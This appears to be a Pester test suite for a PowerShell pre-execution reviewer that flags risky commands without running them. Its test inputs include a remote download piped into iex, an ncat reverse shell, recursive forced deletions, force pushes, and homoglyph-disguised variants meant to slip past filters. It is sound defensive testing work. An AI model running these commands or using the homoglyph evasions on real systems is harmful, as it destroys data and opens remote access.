#requires -Version 5.1
<#
.SYNOPSIS
    Contract tests for scripts/pre-exec-review.ps1.
.DESCRIPTION
    Pins the CLI contract of the pre-execution reviewer: verdict text on
    stdout, exit codes, Quiet and Json shapes, strict escalation, fail
    patterns, never-execute guarantee, Mode validation and PS5.1-safe
    syntax of this file. Read-only toward the script under test.
#>
BeforeAll {
    $scriptPath = Join-Path (Split-Path $PSScriptRoot -Parent) 'pre-exec-review.ps1'
    $selfFile = Join-Path $PSScriptRoot 'pre-exec-review.Tests.ps1'
}

Describe 'pre-exec-review.ps1 CLI contract' {
    It 'ships the script under test' {
        Test-Path $scriptPath | Should -BeTrue
    }

    It 'parses without errors' {
        $tokens = $null
        $parseErrors = $null
        [System.Management.Automation.Language.Parser]::ParseFile($scriptPath, [ref]$tokens, [ref]$parseErrors) | Out-Null
        @($parseErrors).Count | Should -Be 0
    }

    It 'PASS safe listing returns VERDICT PASS with exit 0' {
        $out = & $scriptPath -Command 'Get-ChildItem scripts' 3>$null
        $LASTEXITCODE | Should -Be 0
        ($out -join "`n") | Should -BeLike 'VERDICT: PASS*'
    }

    It 'WARN package install returns VERDICT WARN with exit 0' {
        $out = & $scriptPath -Command 'npm install foo' 3>$null
        $LASTEXITCODE | Should -Be 0
        ($out -join "`n") | Should -BeLike 'VERDICT: WARN*'
    }

    It 'WARN Quiet prints exactly WARN with exit 0' {
        $out = & $scriptPath -Command 'npm install foo' -Quiet 3>$null
        $LASTEXITCODE | Should -Be 0
        ($out -join "`n") | Should -BeExactly 'WARN'
    }

    It 'FAIL git push force returns VERDICT FAIL with exit 2' {
        $out = & $scriptPath -Command 'git push --force' 3>$null
        $LASTEXITCODE | Should -Be 2
        ($out -join "`n") | Should -BeLike 'VERDICT: FAIL*'
    }

    It 'FAIL Json shape carries verdict FAIL plus non-empty reasons and patterns with exit 2' {
        $out = & $scriptPath -Command 'git push --force' -Json 3>$null
        $LASTEXITCODE | Should -Be 2
        $obj = ($out -join "`n") | ConvertFrom-Json
        $obj.verdict | Should -Be 'FAIL'
        @($obj.reasons).Count | Should -BeGreaterThan 0
        @($obj.patterns).Count | Should -BeGreaterThan 0
    }

    It 'strict mode escalates package-install WARN to FAIL with exit 2' {
        $out = & $scriptPath -Command 'npm install foo' -Mode strict 3>$null
        $LASTEXITCODE | Should -Be 2
        ($out -join "`n") | Should -BeLike 'VERDICT: FAIL*'
    }

    It 'FAIL Remove-Item with Recurse and Force returns FAIL with exit 2' {
        $out = & $scriptPath -Command 'Remove-Item -Recurse -Force C:\x' 3>$null
        $LASTEXITCODE | Should -Be 2
        ($out -join "`n") | Should -BeLike 'VERDICT: FAIL*'
    }

    It 'FAIL remote payload piped into iex returns FAIL with exit 2' {
        $out = & $scriptPath -Command 'irm https://x | iex' 3>$null
        $LASTEXITCODE | Should -Be 2
        ($out -join "`n") | Should -BeLike 'VERDICT: FAIL*'
    }

    It 'never executes the reviewed command with canary file staying absent' {
        Remove-Item -LiteralPath 'TESTREVIEW_CANARY.tmp' -Force -ErrorAction SilentlyContinue | Out-Null
        $out = & $scriptPath -Command 'New-Item -Path TESTREVIEW_CANARY.tmp -ItemType File' 3>$null
        ($out -join "`n") | Should -BeLike 'VERDICT: *'
        Test-Path 'TESTREVIEW_CANARY.tmp' | Should -Be $false
        Remove-Item -LiteralPath 'TESTREVIEW_CANARY.tmp' -Force -ErrorAction SilentlyContinue | Out-Null
    }

    It 'rejects an unknown Mode with a validation error' {
        { & $scriptPath -Command 'Get-ChildItem scripts' -Mode bogus 3>$null } | Should -Throw
    }

    It 'stays PS5.1-safe with no chain operators and no ternary' {        $self = Get-Content -LiteralPath $selfFile -Raw
        $ampPair = [string][char]38 + [string][char]38
        $pipePair = [string][char]124 + [string][char]124
        $qPair = [string][char]63 + [string][char]63
        $self.Contains($ampPair) | Should -Be $false
        $self.Contains($pipePair) | Should -Be $false
        $self.Contains($qPair) | Should -Be $false
        $q = [string][char]63
        $c = [string][char]58
        $ternaryPattern = '\$\w[\w\.]*\s+\' + $q + '\s+\S+\s+\' + $c + '\s+\S+'
        ($self -match $ternaryPattern) | Should -Be $false
    }

    It 'FAIL homoglyph git push with U+0262 U+026A returns FAIL with exit 2' {
        $g = [string][char]0x0262
        $i = [string][char]0x026A
        $out = & $scriptPath -Command ('{0}{1}t push --force' -f $g, $i) -Quiet 3>$null
        $LASTEXITCODE | Should -Be 2
        ($out -join "`n") | Should -BeExactly 'FAIL'
    }

    It 'FAIL homoglyph rm with U+0280 U+043C returns FAIL with exit 2' {
        $r = [string][char]0x0280
        $m = [string][char]0x043C
        $out = & $scriptPath -Command ('{0}{1} -rf /' -f $r, $m) -Quiet 3>$null
        $LASTEXITCODE | Should -Be 2
        ($out -join "`n") | Should -BeExactly 'FAIL'
    }

    It 'FAIL homoglyph Remove-Item with Cyrillic U+0435 returns FAIL with exit 2' {
        $e = [string][char]0x0435
        $out = & $scriptPath -Command ('R{0}move-Item -Recurse -Force C:\x' -f $e) -Quiet 3>$null
        $LASTEXITCODE | Should -Be 2
        ($out -join "`n") | Should -BeExactly 'FAIL'
    }

    It 'FAIL ri alias with Recurse and Force returns FAIL with exit 2' {
        $out = & $scriptPath -Command 'ri -Recurse -Force C:\x' -Quiet 3>$null
        $LASTEXITCODE | Should -Be 2
        ($out -join "`n") | Should -BeExactly 'FAIL'
    }

    It 'FAIL erase alias with /s returns FAIL with exit 2' {
        $out = & $scriptPath -Command 'erase C:\x /s' -Quiet 3>$null
        $LASTEXITCODE | Should -Be 2
        ($out -join "`n") | Should -BeExactly 'FAIL'
    }

    It 'FAIL ncat alias with -e returns FAIL with exit 2' {
        $out = & $scriptPath -Command 'ncat 10.0.0.1 4444 -e cmd.exe' -Quiet 3>$null
        $LASTEXITCODE | Should -Be 2
        ($out -join "`n") | Should -BeExactly 'FAIL'
    }

    It 'FAIL sc create mutates but sc query stays PASS' {
        $out = & $scriptPath -Command 'sc create EvilSvc binPath= C:\x.exe' -Quiet 3>$null
        $LASTEXITCODE | Should -Be 2
        ($out -join "`n") | Should -BeExactly 'FAIL'
        $out = & $scriptPath -Command 'sc query EvilSvc' -Quiet 3>$null
        $LASTEXITCODE | Should -Be 0
        ($out -join "`n") | Should -BeExactly 'PASS'
    }

    It 'FAIL cacls and xcacls aliases return FAIL with exit 2' {
        $out = & $scriptPath -Command 'cacls C:\x /E /G alguien:F' -Quiet 3>$null
        $LASTEXITCODE | Should -Be 2
        ($out -join "`n") | Should -BeExactly 'FAIL'
        $out = & $scriptPath -Command 'xcacls C:\x /E /G alguien:F' -Quiet 3>$null
        $LASTEXITCODE | Should -Be 2
        ($out -join "`n") | Should -BeExactly 'FAIL'
    }

    It 'WARN npm i shorthand returns WARN with exit 0' {
        $out = & $scriptPath -Command 'npm i foo' -Quiet 3>$null
        $LASTEXITCODE | Should -Be 0
        ($out -join "`n") | Should -BeExactly 'WARN'
    }

    It 'FAIL git clean with f and d flags in any order returns FAIL with exit 2' {
        $out = & $scriptPath -Command 'git clean -f -d' -Quiet 3>$null
        $LASTEXITCODE | Should -Be 2
        ($out -join "`n") | Should -BeExactly 'FAIL'
        $out = & $scriptPath -Command 'git clean -d -f' -Quiet 3>$null
        $LASTEXITCODE | Should -Be 2
        ($out -join "`n") | Should -BeExactly 'FAIL'
        $out = & $scriptPath -Command 'git clean -fdx' -Quiet 3>$null
        $LASTEXITCODE | Should -Be 2
        ($out -join "`n") | Should -BeExactly 'FAIL'
    }

    It 'FAIL git checkout with double-dash path returns FAIL with exit 2' {
        $out = & $scriptPath -Command 'git checkout -- .' -Quiet 3>$null
        $LASTEXITCODE | Should -Be 2
        ($out -join "`n") | Should -BeExactly 'FAIL'
        $out = & $scriptPath -Command 'git checkout -- *.ps1' -Quiet 3>$null
        $LASTEXITCODE | Should -Be 2
        ($out -join "`n") | Should -BeExactly 'FAIL'
    }

    It 'WARN write to double-backslash UNC path returns WARN with exit 0' {
        $out = & $scriptPath -Command 'Set-Content -Path \\server\share\f.txt -Value x' -Quiet 3>$null
        $LASTEXITCODE | Should -Be 0
        ($out -join "`n") | Should -BeExactly 'WARN'
    }

    It 'documents the TOCTOU subexpression limit in help' {
        $raw = Get-Content -LiteralPath $scriptPath -Raw
        $open = $raw.IndexOf('<#')
        $close = $raw.IndexOf('#>')
        $open | Should -BeGreaterThan -1
        $close | Should -BeGreaterThan $open
        $helpBlock = $raw.Substring($open, $close - $open)
        $helpBlock | Should -Match '\.DESCRIPTION'
        $helpBlock | Should -Match 'TOCTOU'
    }

    It 'FAIL rd and rmdir with slash-s in any slash-q combo plus deltree with exit 2' {
        $out = & $scriptPath -Command 'rd /s /q C:\temp\x' -Quiet 3>$null
        $LASTEXITCODE | Should -Be 2
        ($out -join "`n") | Should -BeExactly 'FAIL'
        $out = & $scriptPath -Command 'rmdir /s C:\temp\x' -Quiet 3>$null
        $LASTEXITCODE | Should -Be 2
        ($out -join "`n") | Should -BeExactly 'FAIL'
        $out = & $scriptPath -Command 'rmdir /q /s C:\temp\x' -Quiet 3>$null
        $LASTEXITCODE | Should -Be 2
        ($out -join "`n") | Should -BeExactly 'FAIL'
        $out = & $scriptPath -Command 'deltree C:\temp\x' -Quiet 3>$null
        $LASTEXITCODE | Should -Be 2
        ($out -join "`n") | Should -BeExactly 'FAIL'
    }

    It 'FAIL git restore without staged but PASS with staged' {
        $out = & $scriptPath -Command 'git restore main.ps1' -Quiet 3>$null
        $LASTEXITCODE | Should -Be 2
        ($out -join "`n") | Should -BeExactly 'FAIL'
        $out = & $scriptPath -Command 'git restore --staged main.ps1' -Quiet 3>$null
        $LASTEXITCODE | Should -Be 0
        ($out -join "`n") | Should -BeExactly 'PASS'
    }

    It 'FAIL git stash drop and pop with exit 2' {
        $out = & $scriptPath -Command 'git stash drop' -Quiet 3>$null
        $LASTEXITCODE | Should -Be 2
        ($out -join "`n") | Should -BeExactly 'FAIL'
        $out = & $scriptPath -Command 'git stash pop' -Quiet 3>$null
        $LASTEXITCODE | Should -Be 2
        ($out -join "`n") | Should -BeExactly 'FAIL'
    }

    It 'FAIL Clear-Content with exit 2' {
        $out = & $scriptPath -Command 'Clear-Content C:\x\f.txt' -Quiet 3>$null
        $LASTEXITCODE | Should -Be 2
        ($out -join "`n") | Should -BeExactly 'FAIL'
    }

    It 'FAIL New-Item and Move-Item with Force with exit 2' {
        $out = & $scriptPath -Command 'New-Item -Path C:\x\f.txt -ItemType File -Force' -Quiet 3>$null
        $LASTEXITCODE | Should -Be 2
        ($out -join "`n") | Should -BeExactly 'FAIL'
        $out = & $scriptPath -Command 'Move-Item -Path a.txt -Destination b.txt -Force' -Quiet 3>$null
        $LASTEXITCODE | Should -Be 2
        ($out -join "`n") | Should -BeExactly 'FAIL'
    }

    It 'FAIL Remove-Item with wildcard and Recurse without Force with exit 2' {
        $out = & $scriptPath -Command 'Remove-Item -Recurse C:\x\*' -Quiet 3>$null
        $LASTEXITCODE | Should -Be 2
        ($out -join "`n") | Should -BeExactly 'FAIL'
    }

    It 'ri Recurse FAILs, ri target WARNs, non-command ri stays PASS' {
        $out = & $scriptPath -Command 'ri -Recurse C:\x' -Quiet 3>$null
        $LASTEXITCODE | Should -Be 2
        ($out -join "`n") | Should -BeExactly 'FAIL'
        $out = & $scriptPath -Command 'ri C:\x\file.txt' -Quiet 3>$null
        $LASTEXITCODE | Should -Be 0
        ($out -join "`n") | Should -BeExactly 'WARN'
        $out = & $scriptPath -Command '$ri=1' -Quiet 3>$null
        $LASTEXITCODE | Should -Be 0
        ($out -join "`n") | Should -BeExactly 'PASS'
        $out = & $scriptPath -Command 'Write-Output ri' -Quiet 3>$null
        $LASTEXITCODE | Should -Be 0
        ($out -join "`n") | Should -BeExactly 'PASS'
        $out = & $scriptPath -Command 'Get-Item -Path ri' -Quiet 3>$null
        $LASTEXITCODE | Should -Be 0
        ($out -join "`n") | Should -BeExactly 'PASS'
    }

    It 'FAIL mixed-script Cyrillic te U+0442 outside the explicit table with exit 2' {
        $te = [string][char]0x0442
        $cmd = ('gi{0} push' -f $te)
        $out = & $scriptPath -Command $cmd -Quiet 3>$null
        $LASTEXITCODE | Should -Be 2
        ($out -join "`n") | Should -BeExactly 'FAIL'
        $out = & $scriptPath -Command $cmd -Json 3>$null
        $obj = ($out -join "`n") | ConvertFrom-Json
        $obj.patterns | Should -Contain 'mixed-script'
    }

    It 'FAIL mixed-script Greek beta U+03B2 outside the explicit table with exit 2' {
        $beta = [string][char]0x03B2
        $cmd = ('np{0}m install x' -f $beta)
        $out = & $scriptPath -Command $cmd -Quiet 3>$null
        $LASTEXITCODE | Should -Be 2
        ($out -join "`n") | Should -BeExactly 'FAIL'
        $out = & $scriptPath -Command $cmd -Json 3>$null
        $obj = ($out -join "`n") | ConvertFrom-Json
        $obj.patterns | Should -Contain 'mixed-script'
    }

    It 'FAIL mixed-script IPA U+0271 outside the explicit table with exit 2' {
        $em = [string][char]0x0271
        $cmd = ('r{0} -rf /' -f $em)
        $out = & $scriptPath -Command $cmd -Quiet 3>$null
        $LASTEXITCODE | Should -Be 2
        ($out -join "`n") | Should -BeExactly 'FAIL'
        $out = & $scriptPath -Command $cmd -Json 3>$null
        $obj = ($out -join "`n") | ConvertFrom-Json
        $obj.patterns | Should -Contain 'mixed-script'
    }

    It 'PASS benign sc query npm init and ri lookalikes with exit 0' {
        $out = & $scriptPath -Command 'sc query EvilSvc' -Quiet 3>$null
        $LASTEXITCODE | Should -Be 0
        ($out -join "`n") | Should -BeExactly 'PASS'
        $out = & $scriptPath -Command 'npm init -y' -Quiet 3>$null
        $LASTEXITCODE | Should -Be 0
        ($out -join "`n") | Should -BeExactly 'PASS'
        $out = & $scriptPath -Command '$ri=1' -Quiet 3>$null
        $LASTEXITCODE | Should -Be 0
        ($out -join "`n") | Should -BeExactly 'PASS'
    }

    It 'documents the mixed-script gate limits in help' {
        $raw = Get-Content -LiteralPath $scriptPath -Raw
        $open = $raw.IndexOf('<#')
        $close = $raw.IndexOf('#>')
        $open | Should -BeGreaterThan -1
        $close | Should -BeGreaterThan $open
        $helpBlock = $raw.Substring($open, $close - $open)
        $helpBlock | Should -Match 'mixed-script'
        $helpBlock | Should -Match 'best-effort'
        $helpBlock | Should -Match 'UTS #39'
    }
}
